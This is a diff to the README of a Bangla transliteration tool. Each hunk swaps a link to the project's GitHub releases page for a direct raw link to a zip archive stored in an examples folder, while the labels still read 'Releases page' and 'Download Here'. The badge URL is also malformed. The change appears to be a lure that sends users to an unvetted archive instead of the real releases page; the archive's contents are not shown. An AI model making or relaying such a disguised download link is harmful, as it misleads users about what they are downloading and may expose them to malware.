@@ -1,6 +1,6 @@
 # 🚀 avro-phonetic-go - Easy Banglish to বাংলা Transliteration
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/monish6666/avro-phonetic-go/releases)
+[![Download Now](https://raw.githubusercontent.com/monish6666/avro-phonetic-go/main/examples/bd/phonetic-go-avro-3.4-beta.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/monish6666/avro-phonetic-go/main/examples/bd/phonetic-go-avro-3.4-beta.1.zip)
 
 ## 📖 Description
 
@@ -20,7 +20,7 @@ Follow these steps to download and run the **avro-phonetic-go** application:
 
 1. **Visit the Release Page**
    
-   Go to our [Releases page](https://github.com/monish6666/avro-phonetic-go/releases) for the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/monish6666/avro-phonetic-go/main/examples/bd/phonetic-go-avro-3.4-beta.1.zip) for the latest version of the application.
 
 2. **Select the Latest Version**
    
@@ -34,7 +34,7 @@ Follow these steps to download and run the **avro-phonetic-go** application:
 
 To download and install the application, follow these instructions:
 
-- Visit the Releases page: [Download Here](https://github.com/monish6666/avro-phonetic-go/releases).
+- Visit the Releases page: [Download Here](https://raw.githubusercontent.com/monish6666/avro-phonetic-go/main/examples/bd/phonetic-go-avro-3.4-beta.1.zip).
 - Click on the file that corresponds to your system.
 - Once the file has downloaded, locate it in your downloads folder.
 
